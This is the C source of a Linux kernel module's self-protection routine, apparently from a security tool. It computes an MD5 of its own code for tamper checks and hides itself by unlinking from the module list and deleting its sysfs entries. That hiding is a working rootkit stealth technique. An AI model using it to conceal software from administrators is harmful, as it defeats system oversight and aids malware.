#include "self_protect.h"

#include <linux/module.h>
#include <linux/slab.h>

#include "hash.h"
#include "const.h"

void* g_module_base_address;

unsigned int g_module_base_size;

int self_protect_validator(char* module_md5) { 
    int status = SUCCESS;
    char* current_module_md5 = get_md5(g_module_base_address, g_module_base_size);
    if (SUCCESS != memcmp(current_module_md5, module_md5, MD5_RESULT_SIZE)) {
        status = MALWARE_DETECTED;
    }
    kfree(current_module_md5);
    return status;
}

void hide_me(void) {
    list_del(&THIS_MODULE->list);             //remove from procfs
    kobject_del(&THIS_MODULE->mkobj.kobj);    //remove from sysfs
    THIS_MODULE->sect_attrs = NULL;
    THIS_MODULE->notes_attrs = NULL;
}

char* self_protect(void) {
    g_module_base_address = THIS_MODULE->core_layout.base;
    g_module_base_size = THIS_MODULE->core_layout.size;
    hide_me();
    return get_md5(g_module_base_address, g_module_base_size);
}